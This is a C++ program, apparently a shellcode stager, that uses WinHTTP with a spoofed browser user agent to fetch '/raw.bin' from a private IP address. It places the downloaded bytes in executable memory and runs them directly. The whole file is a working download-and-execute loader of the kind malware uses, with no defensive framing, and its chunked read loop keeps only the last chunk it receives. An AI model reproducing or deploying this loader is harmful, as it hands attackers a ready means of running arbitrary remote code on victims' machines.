// Example Source: https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpreaddata

#include <Windows.h>
#include <winhttp.h>
#include <iostream>
#include <vector>

#pragma comment(lib, "winhttp.lib")

using namespace std;

int main() {
	HINTERNET hSession = WinHttpOpen(
		L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS, 0);
	HINTERNET hConnect = WinHttpConnect(hSession, L"192.168.255.2", 80, 0);
	HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", L"/raw.bin",
		NULL,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES, 0);
	BOOL bResults = WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS, 0,
		WINHTTP_NO_REQUEST_DATA, 0,
		0, 0);
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// iniitalize variables
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	vector<char> buffer;
	BOOL bDone = FALSE;

	if (bResults) {
		do {
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
				// handle error here.
				break;
			}

			if (dwSize == 0) break;

			buffer.resize(dwSize);

			if (!WinHttpReadData(hRequest, buffer.data(), dwSize, &dwDownloaded)) {
				break;
			}

		} while (dwSize > 0);

		void* exec = VirtualAlloc(
			0,
			buffer.size() + 1,
			MEM_COMMIT | MEM_RESERVE,
			PAGE_EXECUTE_READWRITE);

		memcpy(
			exec,
			buffer.data(),
			buffer.size()
		);

		((void(*)())exec)();
	}

	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return 0;

}